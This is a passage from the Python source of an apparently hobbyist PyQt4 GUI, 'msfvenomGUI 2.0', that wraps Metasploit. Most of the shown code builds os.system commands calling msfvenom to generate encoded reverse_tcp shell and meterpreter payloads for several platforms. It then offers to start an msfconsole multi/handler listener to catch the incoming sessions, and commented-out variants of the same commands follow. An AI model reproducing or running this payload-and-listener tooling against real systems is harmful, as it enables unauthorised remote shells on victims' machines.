								if runmetasploit == QMessageBox.Yes:
									os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
							else:
								error_save = QMessageBox.about(self.window,"ERROR","ERROR")
						elif self.payload.currentText() == "meterpreter":
							error_generate = QMessageBox.about(self.window,"ERROR"," payload ruby it shell Just ); \n\n     Not meterpreter")
				elif self.formats.currentText() == "rb":
					if self.payload.currentText() == "shell":
						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						os.system("clear")
						if os.path.exists(str(self.save.text()+"."+self.formats.currentText())):
							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
							if runmetasploit == QMessageBox.Yes:
								os.system("msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit\"")
						else:
							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
					elif self.payload.currentText() == "meterpreter":
						error_generate = QMessageBox.about(self.window,"ERROR"," payload ruby it shell Just ); \n\n     Not meterpreter")
			#####################################################################################################
			def generate_payload():
				if self.platforms.currentText() == "windows":
					windows()
					os.system("clear")
				elif self.platforms.currentText() == "linux":
					linux()
					os.system("clear")
				elif self.platforms.currentText() == "android":
					android()
					os.system("clear")
				elif self.platforms.currentText() == "python":
					python()
					os.system("clear")
				elif self.platforms.currentText() == "java":
					java()
					os.system("clear")
				elif self.platforms.currentText() == "ruby":
					ruby()
					os.system("clear")
			self.generate = QPushButton("Generate",self.window)
			self.generate.move(280 ,240)
			self.generate.resize(200,35)
			self.generate.clicked.connect(generate_payload)
	#############################################################################################################################################################################
			####################################################{Label}
			#name host
			self.host = QLabel(self.window,text="HOST")
			self.host.move(360 , 40)
			#name port
			self.port = QLabel(self.window,text="PORT")
			self.port.move(360 , 100)
			#name save
			self.saven = QLabel(self.window,text="Save")
			self.saven.move(360 , 160)
			#name plateforms
			self.platforms0 = QLabel(self.window,text="platforms")
			self.platforms0.move(108 ,40)
			#name paylaod
			self.payload0 = QLabel(self.window,text="Payload")
			self.payload0.move(110 ,100)
			#name formats
			self.formats0 = QLabel(self.window,text="formats")
			self.formats0.move(110 ,160)
			#name encoder
			self.encoder0 = QLabel(self.window,text="encoder")
			self.encoder0.move(110 ,220)
			#name youtube
			self.youtube = QLabel(self.window,text="YouTube: Black rOOt")
			self.youtube.move(50 ,5)
			#name instagram
			self.instagram = QLabel(self.window,text="instagram: 8mkj")
			self.instagram.move(207 ,5)
			# name version
			self.version = QLabel(self.window,text="msfvenomGUI 2.0")
			self.version.move(330 ,5)
			###########################################################################################
			self.window.show()
			self.Application.exec_()
	if 1 == True:
		msf = Application0()
		msf.Application00()
except ImportError:
    print ("Please install PyQt4\n\tPlease write python install.py")
############################################################################################
#currentText()
#os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -a "+str(self.arch.currentText())+" -e "+str(self.encoder.currentText())+" -f "+str(self.formats.currentText())+" -o /root/"+str(self.name.text()))                                                                                     
#setCurrentIndex()
#if self.encoder.currentText() == "none":
#				if self.arch.currentText() == "none":
#					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o /root/"+str(self.name.text())+"."+str(self.formats.currentText()))
#			elif self.arch.currentText() == "none":
#				os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -f "+str(self.formats.currentText())+" -o /root/"+str(self.name.text())+"."+str(self.formats.currentText()))			elif self.encoder.currentText() == "none":
#				os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -a "+str(self.arch.currentText())+" -f "+str(self.formats.currentText())+" -o /root/"+str(self.name.text())+"."+str(self.formats.currentText()))
#			else:
#				os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -a "+str(self.arch.currentText())+" -f "+str(self.formats.currentText())+" -o /root/"+str(self.name.text())+"."+str(self.formats.currentText()))
				









